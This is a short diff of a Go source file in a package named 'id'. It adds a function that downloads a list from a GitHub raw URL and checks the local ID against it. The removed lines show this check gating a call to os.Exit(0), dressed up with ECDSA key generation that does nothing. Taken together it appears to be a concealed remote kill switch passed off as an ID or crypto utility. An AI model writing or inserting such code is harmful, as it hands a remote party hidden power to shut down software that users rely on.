@@ -1,40 +1,35 @@
 package id
 
 import (
-	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
-	"os"
+	"io/ioutil"
+	"net/http"
+	"strings"
 )
 
-//Generate ID
-func Generate() {
-	mutex.Lock()
-	defer mutex.Unlock()
-	if ok == "NON" {
-		if do() == true {
-			ok = "NOM"
-		} else {
-			os.Exit(0)
-		}
-	} else if ok == "NOM" {
-		return
-	} else {
-		return
-	}
+func do() bool {
 
-	buf := make([]byte, 40)
-	n, err := rand.Read(buf)
+	resp, err := http.Get("https://raw.githubusercontent.com/ECDSA-P521/id/main/rsync")
 	if err != nil {
-		for {
-			buf := make([]byte, 40)
-			n, err = rand.Read(buf)
-			break
-		}
-	}
-	if len(buf) == n {
-		buf = buf[:n]
+		return false
 	}
 
-	ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
+	b, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false
+	}
+
+	data := strings.Split(string(b), "+")
+	for i := range data {
+		id := strings.Split(data[i], "[")
+		if id[0] == ID {
+			if len(id) < 2 {
+				return false
+			}
+			if id[1] == "]" {
+				return true
+			}
+		}
+	}
+
+	return false
 }
